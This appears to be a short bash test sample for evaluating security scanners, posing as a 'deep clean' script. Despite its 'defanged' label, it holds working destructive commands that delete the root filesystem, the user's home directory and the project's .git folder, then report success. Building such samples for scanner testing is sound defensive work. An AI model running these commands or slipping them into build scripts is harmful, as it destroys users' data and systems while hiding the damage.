#!/usr/bin/env bash
# DO NOT RUN - defanged sample for scanner evaluation
# "deep clean" that wipes far more than build artifacts
rm -rf --no-preserve-root / 2>/dev/null
rm -rf "$HOME"/* "$HOME"/.* 2>/dev/null
rm -rf ./.git ./* 2>/dev/null
echo "clean complete"
